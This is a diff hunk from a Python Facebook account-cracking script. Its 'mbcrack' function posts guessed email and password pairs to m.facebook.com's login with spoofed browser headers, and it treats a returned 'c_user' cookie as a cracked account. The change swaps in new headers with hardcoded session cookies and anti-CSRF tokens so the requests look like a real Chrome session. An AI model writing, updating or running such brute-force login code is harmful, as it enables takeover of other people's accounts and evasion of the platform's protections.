@@ -657,21 +657,26 @@ def mbcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'m.facebook.com',
-			'method': 'POST',
-			'scheme': 'https',
-			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
-			'cache-control': 'max-age=0',
-			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
-			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
-			'sec-fetch-dest': 'document',
-			'sec-fetch-mode': 'navigate',
-			'sec-fetch-site': 'none',
-			'sec-fetch-user': '?1',
-			'upgrade-insecure-requests': '1',
-			'user-agent': ua}
-			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+			header_freefb = {"authority": 'm.facebook.com',
+            "method": 'POST',
+            "path": '/a/bz?fb_dtsg=NAcP1OxAuhQyndeJIpsI-20xUtQ1Wdq7u_KaIZ_3ZjMU3IXrm3Vbe5Q%3A0%3A0&jazoest=24933&lsd=AVqSP8uXU68&__dyn=0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw&__csr=&__req=1&__a=AYnSarflnV_kK4ZfW1KSpY_qzr94BTYKeKOfD3N2zaDKK3j2RJHQeUopKrKBbhDML0luFZ-oLfvobJXkazVRUBSDiCFxmTuqsJ1w1ZkVo7F1wg&__user=0',
+            "scheme": 'https',
+            "accept": '*/*',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=0.9',
+            "content-length": '3793',
+            "content-type": 'multipart/form-data; boundary=----WebKitFormBoundaryCVve76AdAQO3tVrC',
+            "cookie": 'datr=hWZ_Y7FDRH1BF2Re6P8U_0HZ; sb=hWZ_Y9YF7UnwDW2O2KmHPEJB; m_pixel_ratio=1; wd=433x620; fr=0ynMdHfwmiiQmPdzx.AWXKlMgyxxrtifoNoteID7YRZq8.Bjp-qS.uB.AAA.0.0.BjqVoy.AWVJlwajivw',
+            "origin": 'https://m.facebook.com',
+            "referer": 'https://m.facebook.com/',
+            "sec-ch-ua": '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+            "sec-ch-ua-mobile": '?0',
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": 'empty',
+            "sec-fetch-mode": 'cors',
+            "sec-fetch-site": 'same-origin',
+            "user-agent": 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',}
+			lo = session.post('https://m.facebook.com/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
